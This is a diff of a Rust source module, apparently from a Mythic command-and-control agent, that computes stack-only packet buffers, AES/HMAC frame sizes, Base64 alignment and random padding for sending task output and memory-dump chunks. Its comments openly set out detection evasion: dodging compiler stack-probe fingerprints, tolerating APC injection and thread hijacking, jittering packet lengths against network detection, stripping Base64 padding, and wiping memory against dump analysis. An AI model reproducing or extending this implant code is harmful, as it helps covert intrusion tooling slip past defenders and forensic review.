@@ -1,52 +1,197 @@
 // 尚未引入多线程.还是通过mythic的状态机已经实现了多线程?
 
-// 文件流式分片传输与断点续传状态机已在独立模块 `crate::file_transfer` 中实现 (严格遵循 Mythic 4.0 Offset 规范与 zero-heap 内存契约)
+// 本文件作用:杜绝通过堆分配暂存数据,而是用纯栈将数据加密发出.默认使用4kb的大小.
 
-//! # 4KB/16KB/64KB 栈缓冲与流式切片内存管理契约 (Zero-Heap Stack Memory & Budget Primitives)
+// 如果要修改缓冲区大小(默认4kb),只需要在 4. 【核心配置开关】全局当前激活缓冲区大小 (Active Buffer Size Knob)这里将WIRE_SIZE_4K改为WIRE_SIZE_16K/WIRE_SIZE_64K
 //!
-//! ## 架构核心哲学与 Windows 10/11 规避对抗 (OPSEC)
-//!
-//! 1. **Caller-Provided Buffer（调用者提供外包缓冲区）**：
-//!    - 将 4KB 缓冲区的控制权上移至调用者，底层纯计算叶子函数（如 `seal_message`）仅接收 `&mut [u8]` 切片（胖指针仅 16 字节），栈帧严格控制在 64 字节以内。
-//!    - 内存解耦：调用者可自由决定将 4KB 缓冲区放置于当前栈帧、静态数据段（`.data`/`.bss`）、专用私有堆（Private Heap）或会话状态机中。
-//! 2. **消除双重缓冲与内存开销减半**：
-//!    - 杜绝“网络层准备 4KB + 加密函数内部局部数组 4KB = 8KB 栈深度”的冗余，实现全链路 In-place（原地）组装与转换。
-//! 3. **规避 MSVC 栈探针 (`__chkstk`) 与 Guard Page 异常**：
+//! features
+//! 1. Caller-Provided Buffer Pattern（调用者提供外包缓冲区模式） 详见buffer.md
+//! 2. **规避 MSVC 栈探针 (`__chkstk`) 与 Guard Page 异常**：
 //!    - 在 Windows x64 ABI 下，当函数局部变量超过 4096 字节（1 个页面）时，编译器会强制插入 `__chkstk` 探针符号以触碰 `PAGE_GUARD` 保护页，产生显著静态指纹。
 //!    - 在深调用栈、APC 注入、Thread Hijacking 或 Stack Spoofing（栈伪造）场景下，宿主线程剩余可用栈极浅（可能仅有数 KB），轻量叶子栈帧可杜绝爆栈崩溃。
-//! 4. **严格 3 字节对齐无填充 Base64 法则**：
+//! 3. **严格 3 字节对齐无填充 Base64 法则**：
 //!    - 磁盘/管道原始数据单次读取上限 (`MAX_RAW_READ`) 严格向下对齐到 3 字节倍数，保证应用层内层 Base64 绝无尾部 `=` 或 `==` 填充字符，彻底消除微观流量指纹。
-//! 5. **网络发包切片化与双层 Jitter 混淆**：
+//! 4. **网络发包切片化与双层 Jitter 混淆**：
 //!    - 栈缓冲区保上限 (`WIRE_SIZE`)，实际网络发包通过 `encode_to_slice` 仅传递有效切片；配合 `jittered_raw_read` 与 JSON 动态伪装字段 `_p`，破坏 NDR 基于固定包长的统计分析。
-//! 6. **硬件级内存擦除 (Hardware Volatile Zeroization)**：
+//! 5. **硬件级内存擦除 (Hardware Volatile Zeroization)**：
 //!    - 通过 `core::ptr::write_volatile` 进行物理洗白，阻止 LLVM 作为 Dead Code 进行死码消除（Dead Code Elimination），等价于 Windows 原生 `SecureZeroMemory`，防御 Process Minidump、内存扫描与 Heap Remanence。
 
-extern crate alloc;
 
-#[cfg(any(debug_assertions, test))]
-use alloc::string::String;
 use base64::prelude::*;
 use core::mem::MaybeUninit;
 use serde::{Deserialize, Serialize};
 
-// ==========================================
-// 1. 协议物理核心常量重导出 (Canonical Protocol Constants)
-//    统一定义并抽象于 crate::lib，在此重导出确保向下兼容
-// ==========================================
-pub use crate::{
-    AES_BLOCK_SIZE, BUFFER_SIZE, ACTIVE_WIRE_SIZE, DEFAULT_JSON_OVERHEAD, DEFAULT_MAX_JITTER, HMAC_LEN, IV_LEN,
-    PADDING_FIELD_OVERHEAD, PKCS7_WORST_PADDING, PROTOCOL_HEADER_LEN, PROTOCOL_OVERHEAD,
-    UUID_LEN,
-};
+// =========================================================================
+// 1. 协议物理核心常量 (Protocol Physical & Cryptographic Constants)
+/*
+┌──────────────┬──────────────┬────────────────────────────┬──────────────┐
+│  UUID (36B)  │   IV (16B)   │  AES Ciphertext (密文, PKCS#7 填充) │  HMAC (32B)  │
+└──────────────┴──────────────┴────────────────────────────┴──────────────┘
+     固定 36B        固定 16B             最小 16B (!)             固定 32B
+*/
+//=========================================================================
 
-// ==========================================
-// 2. 参数化协议预算模板 (PacketBudget Template)
-// ==========================================
+/// Agent 唯一识别符 UUID 规范长度 (36 字节 ASCII 文本)
+pub const UUID_LEN: usize = 36;
+
+/// 密码学对称加密初始向量 IV 长度 (AES-256-CBC 严格要求 16 字节)
+pub const IV_LEN: usize = 16;
+
+/// HMAC-SHA256 完整性校验签名 Tag 长度 (SHA-256 摘要 32 字节)
+pub const HMAC_LEN: usize = 32;
+
+/// AES 块分组密码长度 (16 字节)
+pub const AES_BLOCK_SIZE: usize = 16;
+
+/// PKCS#7 块填充最坏情况开销 (即使刚好对齐也必须补满整块 16 字节)
+pub const PKCS7_WORST_PADDING: usize = 16;
+
+/// 不带uuid,密文载荷区最小物理长度 (IV 16 + 最小密文块 16 + HMAC 32 = 64 字节)
+pub const MIN_ENCRYPTED_PAYLOAD_LEN: usize = IV_LEN + AES_BLOCK_SIZE + HMAC_LEN;
+
+/// 协议物理帧头部与防伪尾部固定开销 (UUID 36 + IV 16 + HMAC 32 = 84 字节)
+pub const PROTOCOL_HEADER_LEN: usize = UUID_LEN + IV_LEN + HMAC_LEN;
+
+/// 完整二进制报文最小物理长度(即空包) / 协议总安全开销 (UUID 36 + 密文载荷区 64 = 100 字节)
+pub const MIN_RAW_MESSAGE_LEN: usize = UUID_LEN + MIN_ENCRYPTED_PAYLOAD_LEN;
+
+/// 最小包含业务数据的数据包大小=完整二进制报文最小物理长度(即空包)+最少占用16B的加密后的明文区
+pub const MIN_PAYLOAD_RAW_LEN:usize= PROTOCOL_HEADER_LEN + AES_BLOCK_SIZE + PKCS7_WORST_PADDING;
+
+/// 应用层 JSON 骨架开销默认预估 (150 字节)
+pub const DEFAULT_JSON_OVERHEAD: usize = 150;
+
+/// JSON 动态混淆注入 `,"_p":""` 语法骨架字符开销 (8 字节)
+pub const PADDING_FIELD_OVERHEAD: usize = 8;
+
+/// 默认最大动态填充抖动上限 (256 字节)
+pub const DEFAULT_MAX_JITTER: usize = 256;
+
+// =========================================================================
+// 2. 编译期常量计算纯函数 (Compile-Time Const Calculation Functions)
+// =========================================================================
+
+/// 校验出网(待发包)的 Base64 预算规格是否合法,可以在其他文件中复用
+#[inline(always)]
+pub const fn assert_valid_wire_size(wire_size: usize, json_overhead: usize) {
+    // assert! 条件错误时会panic
+    // 1. 这里在fn const函数中 2. assert!后续用在const _SANITY_CHECK中.而const会在编译期求值,如果条件错误会在编译时报错,导致无法编译.如果正确,其包含的明文就不会被带入编译好的二进制文件.所以这里是安全且隐蔽的.
+    assert!(wire_size.is_multiple_of(4), "WIRE_SIZE 必须能被 4 整除以满足 Base64 规范");
+    // 带有效载荷明文的最小数据包转为base64后大小
+    assert!(
+        wire_size >= MIN_PAYLOAD_RAW_LEN * 4 / 3,
+        "WIRE_SIZE 过小，无法容纳协议头与最小密文"
+    );
+    let raw_len = calc_raw_len(wire_size);
+    let cipher_len = calc_max_ciphertext_len(raw_len);
+    let plaintext_len = cipher_len.saturating_sub(PKCS7_WORST_PADDING);
+    assert!(plaintext_len > json_overhead, "明文容量不足以容纳 JSON 骨架开销");
+}
+
+/// 计算出网 Base64 对应的二进制物理帧总容量: (wire_size / 4) * 3
+#[inline(always)]
+pub const fn calc_raw_len(wire_size: usize) -> usize {
+    assert!(wire_size.is_multiple_of(4), "WIRE_SIZE 必须能被 4 整除");
+    (wire_size / 4) * 3
+}
+
+/// 计算指定二进制物理容量下，AES 16 字节对齐的最大密文长度
+#[inline(always)]
+pub const fn calc_max_ciphertext_len(raw_len: usize) -> usize {
+    (raw_len.saturating_sub(PROTOCOL_HEADER_LEN) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE
+}
+
+/// 计算指定二进制物理容量下，第一层明文 JSON 物理容量上限
+#[inline(always)]
+pub const fn calc_max_plaintext_len(raw_len: usize) -> usize {
+    calc_max_ciphertext_len(raw_len).saturating_sub(PKCS7_WORST_PADDING)
+}
+
+/// 计算留给内层 Base64 的 4 字节向下对齐字符容量
+#[inline(always)]
+pub const fn calc_b64_aligned_capacity(plaintext_len: usize, json_overhead: usize) -> usize {
+    (plaintext_len.saturating_sub(json_overhead) / 4) * 4
+}
+
+/// 计算磁盘/管道单次读取上限 (严格向下取整到 3 字节倍数，杜绝内层 Base64 '=' 填充)
+#[inline(always)]
+pub const fn calc_max_raw_read(plaintext_len: usize, json_overhead: usize) -> usize {
+    (calc_b64_aligned_capacity(plaintext_len, json_overhead) / 4) * 3
+}
+
+/// 计算动态读取下限 (取最大读取容量的 70%，并向下保证 3 字节对齐)
+#[inline(always)]
+pub const fn calc_min_raw_read(max_raw_read: usize) -> usize {
+    let seventy_percent = (max_raw_read * 7) / 10;
+    (seventy_percent / 3) * 3
+}
+
+/// 计算明文切片经 PKCS#7 补齐后的长度 (16 字节对齐)
+#[inline(always)]
+pub const fn calc_padded_len(data_len: usize) -> usize {
+    (data_len / AES_BLOCK_SIZE + 1) * AES_BLOCK_SIZE
+}
+
+/// 计算封包所需完整的二进制物理帧总长: UUID(36) + IV(16) + Padded(N) + HMAC(32)
+#[inline(always)]
+pub const fn calc_raw_total(data_len: usize) -> usize {
+    PROTOCOL_HEADER_LEN + calc_padded_len(data_len)
+}
+
+// =========================================================================
+// 3. 协议物理帧候选预设规格 (Physical Wire Size Candidates & Presets)
+// =========================================================================
+
+/// 常规隐蔽心跳与轻量短指令出网包上限 (4KB)
+pub const WIRE_SIZE_4K: usize = 4 * 1024;
+pub const RAW_LEN_4K: usize = calc_raw_len(WIRE_SIZE_4K);
+pub const CIPHERTEXT_LEN_4K: usize = calc_max_ciphertext_len(RAW_LEN_4K);
+pub const PLAINTEXT_LEN_4K: usize = calc_max_plaintext_len(RAW_LEN_4K);
+pub const RAW_READ_4K: usize = calc_max_raw_read(PLAINTEXT_LEN_4K, DEFAULT_JSON_OVERHEAD);
+
+/// 中型任务回显与系统枚举出网包上限 (16KB)
+pub const WIRE_SIZE_16K: usize = 16 * 1024;
+pub const RAW_LEN_16K: usize = calc_raw_len(WIRE_SIZE_16K);
+pub const CIPHERTEXT_LEN_16K: usize = calc_max_ciphertext_len(RAW_LEN_16K);
+pub const PLAINTEXT_LEN_16K: usize = calc_max_plaintext_len(RAW_LEN_16K);
+pub const RAW_READ_16K: usize = calc_max_raw_read(PLAINTEXT_LEN_16K, DEFAULT_JSON_OVERHEAD);
+
+/// 大文件传输与内存 Dump 分片出网包上限 (64KB)
+pub const WIRE_SIZE_64K: usize = 64 * 1024;
+pub const RAW_LEN_64K: usize = calc_raw_len(WIRE_SIZE_64K);
+pub const CIPHERTEXT_LEN_64K: usize = calc_max_ciphertext_len(RAW_LEN_64K);
+pub const PLAINTEXT_LEN_64K: usize = calc_max_plaintext_len(RAW_LEN_64K);
+pub const RAW_READ_64K: usize = calc_max_raw_read(PLAINTEXT_LEN_64K, DEFAULT_JSON_OVERHEAD);
+
+// =========================================================================
+// 4. 【核心配置开关】全局当前激活缓冲区大小 (Active Buffer Size Knob)
+// =========================================================================
+
+pub const BUFFER_SIZE: usize = WIRE_SIZE_4K;
+pub const ACTIVE_WIRE_SIZE: usize = BUFFER_SIZE;
+
+// =========================================================================
+// 5. 激活规格常量与强类型级联衍生 (Active Compile-time Derivations)
+// =========================================================================
+
+pub const MAX_B64_LEN: usize = BUFFER_SIZE;
+pub const MAX_RAW_LEN: usize = calc_raw_len(BUFFER_SIZE);
+pub const MAX_CIPHERTEXT_LEN: usize = calc_max_ciphertext_len(MAX_RAW_LEN);
+pub const MAX_PLAINTEXT_LEN: usize = calc_max_plaintext_len(MAX_RAW_LEN);
+pub const MAX_RAW_READ: usize = calc_max_raw_read(MAX_PLAINTEXT_LEN, DEFAULT_JSON_OVERHEAD);
+
+pub type ActiveBudget = PacketBudget<BUFFER_SIZE>;
+pub type Budget4K = PacketBudget<WIRE_SIZE_4K>;
+pub type Budget16K = PacketBudget<WIRE_SIZE_16K>;
+pub type Budget64K = PacketBudget<WIRE_SIZE_64K>;
+
+// =========================================================================
+// 6. 参数化协议预算模板 (PacketBudget Template)
+// =========================================================================
 
 /// 协议缓冲区与切片预算计算器
 ///
 /// 利用 Rust 的 `const generics` 在编译期完成全套切片公式推导，零运行期开销。
-/// 核心计算算法统一收敛于 crate 根命名空间纯函数。
 ///
 /// * `WIRE_SIZE`: 网络出网目标报文总容量 (如 4KB: 4096, 16KB: 16384, 64KB: 65536)
 /// * `JSON_OVERHEAD`: 应用层 JSON 骨架开销预估 (默认 150 字节)
@@ -54,9 +199,8 @@ pub struct PacketBudget<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize = DEF
 
 impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE, JSON_OVERHEAD> {
     // ----------------- 编译期内部静态断言 -----------------
-    // 私有常量，在 MAX_RAW_LEN 初始化时强制求值，确保参数非法时立刻在编译期拦截
     const _SANITY_CHECK: () = {
-        crate::assert_valid_wire_size(WIRE_SIZE, JSON_OVERHEAD);
+        assert_valid_wire_size(WIRE_SIZE, JSON_OVERHEAD);
     };
 
     // ----------------- 公共导出常量 -----------------
@@ -66,36 +210,31 @@ impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE,
     /// 二进制物理帧暂存区上限 (Base64 解码后容量: WIRE_SIZE * 3 / 4)
     pub const MAX_RAW_LEN: usize = {
         let () = Self::_SANITY_CHECK;
-        crate::calc_raw_len(WIRE_SIZE)
+        calc_raw_len(WIRE_SIZE)
     };
 
     /// 密文区(base64解码后) 16 字节对齐的最大值 (采用 saturating_sub 防溢出)
-    pub const MAX_CIPHERTEXT_LEN: usize = crate::calc_max_ciphertext_len(Self::MAX_RAW_LEN);
+    pub const MAX_CIPHERTEXT_LEN: usize = calc_max_ciphertext_len(Self::MAX_RAW_LEN);
 
     /// 第一层明文 JSON 的物理容量上限 (扣除 16B PKCS#7 保证加密后密文不溢出)
-    pub const MAX_PLAINTEXT_LEN: usize = crate::calc_max_plaintext_len(Self::MAX_RAW_LEN);
+    pub const MAX_PLAINTEXT_LEN: usize = calc_max_plaintext_len(Self::MAX_RAW_LEN);
 
     /// JSON 中留给 Base64 编码的 4B 对齐字符容量.解密后base64是4字节对齐的
     pub const B64_ALIGNED_CAPACITY: usize =
-        crate::calc_b64_aligned_capacity(Self::MAX_PLAINTEXT_LEN, JSON_OVERHEAD);
+        calc_b64_aligned_capacity(Self::MAX_PLAINTEXT_LEN, JSON_OVERHEAD);
 
-    /// 磁盘/管道原始数据单次读取上限 (Raw Read: 严格 3 字节对齐，内层 Base64 绝无 '=' 填充,避免被流量审计发现base64尾部频繁出现填充的特征)
+    /// 磁盘/管道原始数据单次读取上限 (Raw Read: 严格 3 字节对齐，内层 Base64 绝无 '=' 填充)
     pub const MAX_RAW_READ: usize =
-        crate::calc_max_raw_read(Self::MAX_PLAINTEXT_LEN, JSON_OVERHEAD);
-    
-    // 以下是关于网络数据包抖动相关
+        calc_max_raw_read(Self::MAX_PLAINTEXT_LEN, JSON_OVERHEAD);
 
-    /// JSON 注入 `,"_p":""`字段: 所需的最小语法骨架字符开销.即json结构体中插入 ,"_p":"" 这些字符,也需要消耗物理空间.其对应的空间大小是8字节.这里是否考虑对齐?
-    pub const PADDING_FIELD_OVERHEAD: usize = crate::PADDING_FIELD_OVERHEAD;
-
-    /// 推荐的最大动态填充抖动上限 (避免轻量心跳在 64KB 规格下被无意义塞满)
-    pub const DEFAULT_MAX_JITTER: usize = crate::DEFAULT_MAX_JITTER;
+    pub const PADDING_FIELD_OVERHEAD: usize = PADDING_FIELD_OVERHEAD;
+    pub const DEFAULT_MAX_JITTER: usize = DEFAULT_MAX_JITTER;
 
     // ----------------- 动态切片与 Jitter 算法 -----------------
     /// 动态获取读取下限（取最大容量的 70%，并向下保证 3 字节对齐）
     #[inline(always)]
     pub const fn min_raw_read() -> usize {
-        crate::calc_min_raw_read(Self::MAX_RAW_READ)
+        calc_min_raw_read(Self::MAX_RAW_READ)
     }
 
     /// 用于大文件传输工况
@@ -174,27 +313,6 @@ impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE,
         // CHARSET 均为合法 ASCII，此转换 100% 安全且没有任何堆分配与内存拷贝.通过引用的方式写入源字符串的头部,零内存拷贝,零堆分配.
         core::str::from_utf8(&out_buf[..len]).ok()
     }
-
-    /// 高效生成轻量随机 ASCII 伪装字符串 (保留堆分配版本供兼容/快速测试使用)
-    #[inline]
-    #[cfg(any(debug_assertions, test))]
-    pub fn generate_padding(len: usize) -> Option<String> {
-        if len == 0 {
-            return None;
-        }
-        let mut buf = [0u8; 256];
-        if len <= buf.len() {
-            Self::generate_padding_slice(&mut buf, len).map(String::from)
-        } else {
-            const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            let mut s = String::with_capacity(len);
-            for _ in 0..len {
-                let idx = (rand::random::<u8>() as usize) % CHARSET.len();
-                s.push(CHARSET[idx] as char);
-            }
-            Some(s)
-        }
-    }
 }
 
 // ==========================================
@@ -231,25 +349,6 @@ pub fn zeroize_slice(buf: &mut [u8]) {
         unsafe {
             core::ptr::write_volatile(byte, 0);
         }
-    }
-}
-
-/// 将 `alloc::string::String` 底层堆缓冲区原地洗白并刷零
-///
-/// 覆盖 String 的整个 capacity 堆缓冲区（不仅是 len），杜绝 spare capacity 泄露与 Heap Remanence。
-/// 采用裸指针 volatile 写入，严格遵守 Rust 内存模型，杜绝未定义行为 (UB)。
-#[inline(always)]
-#[cfg(any(debug_assertions, test))]
-pub fn zeroize_string(s: &mut String) {
-    let cap = s.capacity();
-    if cap > 0 {
-        let ptr = s.as_mut_ptr();
-        for i in 0..cap {
-            unsafe {
-                core::ptr::write_volatile(ptr.add(i), 0);
-            }
-        }
-        s.clear();
     }
 }
 
@@ -585,8 +684,20 @@ impl<const RAW_LEN: usize, const B64_LEN: usize> Default for StackWorkspace<RAW_
     }
 }
 
+// =========================================================================
+// 8. 激活规格类型别名与纯栈工作区模板衍生 (Active Derivations & Workspace Aliases)
+// =========================================================================
+
+pub type RawBuffer = [u8; MAX_RAW_LEN];
+pub type B64Buffer = [u8; MAX_B64_LEN];
+pub type ActiveStackWorkspace = StackWorkspace<MAX_RAW_LEN, MAX_B64_LEN>;
+pub type DefaultStackWorkspace = ActiveStackWorkspace;
+pub type StackWorkspace4K = StackWorkspace<RAW_LEN_4K, WIRE_SIZE_4K>;
+pub type StackWorkspace16K = StackWorkspace<RAW_LEN_16K, WIRE_SIZE_16K>;
+pub type StackWorkspace64K = StackWorkspace<RAW_LEN_64K, WIRE_SIZE_64K>;
+
 // ==========================================
-// 8. 单元测试模块 (Unit Tests)
+// 9. 单元测试模块 (Unit Tests)
 // ==========================================
 
 #[cfg(test)]
@@ -665,16 +776,11 @@ mod tests {
         assert!(Budget4K::generate_padding_slice(&mut small_buf, 8).is_none());
         assert!(Budget4K::generate_padding_slice(&mut small_buf, 0).is_none());
 
-        // 3. 兼容版堆分配填充验证
-        let padding_str = Budget4K::generate_padding(pad_len).expect("padding string");
-        assert_eq!(padding_str.len(), pad_len);
-        assert!(padding_str.chars().all(|c| c.is_ascii_alphanumeric()));
-
-        // 4. 极端空间压迫下的自适应熔断测试
+        // 3. 极端空间压迫下的自适应熔断测试
         let tight_len = Budget4K::MAX_PLAINTEXT_LEN - 5;
         assert_eq!(Budget4K::get_random_padding_len(tight_len, None), 0);
 
-        // 5. 显式禁用抖动与不足 8 字节混淆阈值的熔断测试
+        // 4. 显式禁用抖动与不足 8 字节混淆阈值的熔断测试
         assert_eq!(Budget4K::get_random_padding_len(raw_json_len, Some(0)), 0);
         assert_eq!(Budget4K::get_random_padding_len(raw_json_len, Some(5)), 0);
     }
@@ -737,13 +843,6 @@ mod tests {
         let mut buf = [0xAAu8; 64];
         zeroize_slice(&mut buf);
         assert_eq!(buf, [0u8; 64]);
-    }
-
-    #[test]
-    fn test_zeroize_string() {
-        let mut s = String::from("secret-task-parameters");
-        zeroize_string(&mut s);
-        assert!(s.as_bytes().iter().all(|&b| b == 0));
     }
 
     #[test]
